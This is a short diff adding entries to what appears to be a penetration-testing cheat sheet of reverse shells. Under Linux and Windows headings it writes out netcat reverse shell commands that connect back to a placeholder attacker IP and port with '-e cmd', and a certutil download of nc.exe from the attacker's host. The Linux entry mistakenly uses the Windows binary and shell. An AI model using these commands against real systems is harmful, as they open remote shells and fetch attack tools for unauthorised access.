@@ -9,5 +9,20 @@ Different kinds of webshells can be found in kali directory.
 
 LINUX SHELL
 
+netcat
+
+wget nc.exe
+
+./nc.exe <myip> <myport> -e cmd
+
+BASH
 
 WINDOWS SHELL
+
+netcat
+
+certutil -urlcache -split -f http://<myip>/nc.exe
+
+.\nc.exe <myip> <myport> -e cmd
+
+POWERSHELL
